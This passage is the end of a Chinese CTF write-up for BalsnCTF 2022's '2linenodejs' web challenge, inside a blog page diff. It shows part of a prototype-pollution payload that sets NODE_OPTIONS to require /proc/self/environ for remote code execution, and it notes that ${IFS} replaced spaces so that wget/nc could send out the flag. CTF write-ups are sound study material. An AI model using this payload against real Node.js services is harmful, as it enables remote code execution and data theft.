+            &quot;NODE_OPTIONS&quot;: &quot;--require=/proc/self/environ&quot;
+        &#125;,
+        &quot;shell&quot;: &quot;/usr/local/bin/node&quot;,
+        &quot;data&quot;: &#123;&quot;name&quot;: &quot;./usage&quot;, &quot;exports&quot;: [&quot;./preinstall.js&quot;]&#125;,
+        &quot;path&quot;: &quot;/opt/yarn-v1.22.19/&quot;,
+        &quot;npm_config_global&quot;: 1
+    &#125;, &quot;x&quot;: null
+&#125;
+</code></pre>
+<p>正则匹配把禁用了空格，所以命令中的空格用${IFS}替代，require用&#x3D;进行连接，成功收到flag(alpine是自带wget和nc的)</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>另一个做法可以参考这篇<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs">2linenodejs</a></p>
+<p>关于child_process的那个理由，就找到一个hpdog师傅写的<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/6755">从Kibana-RCE对nodejs子进程创建的思考</a><br>这里他提到只有fork能用，其实不对，只有execFile和exec不行，因为初始化了options的shell或者env属性，但是按照hpdog的调试方法，其他的console.log也没反应，可能是输出流啥的没处理好吧，改成写文件是可以发现能够成功的</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+              <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/rCore_Tutorial_CP5.html" rel="prev" title="rCore_Tutorial_CP5">
+      <i class="fa fa-chevron-left"></i> rCore_Tutorial_CP5
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BalsnCTF2022-web-wp"><span class="nav-number">1.</span> <span class="nav-text">BalsnCTF2022 web wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#my-first-app"><span class="nav-number">1.1.</span> <span class="nav-text">my first app</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Health-Check1"><span class="nav-number">1.2.</span> <span class="nav-text">Health Check1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Health-Check2"><span class="nav-number">1.3.</span> <span class="nav-text">Health Check2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2linenodejs"><span class="nav-number">1.4.</span> <span class="nav-text">2linenodejs</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number">1.4.1.</span> <span class="nav-text">nodejs原型链污染</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#node%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8F%AF%E6%8E%A7rce"><span class="nav-number">1.4.2.</span> <span class="nav-text">node环境变量可控rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-child-process%E8%B0%83%E7%94%A8%E5%88%B0RCE"><span class="nav-number">1.4.3.</span> <span class="nav-text">原型链污染+child_process调用到RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%8F%AF%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.4.</span> <span class="nav-text">寻找可利用文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">1.5.</span> <span class="nav-text">参考文献</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">166</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">90</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
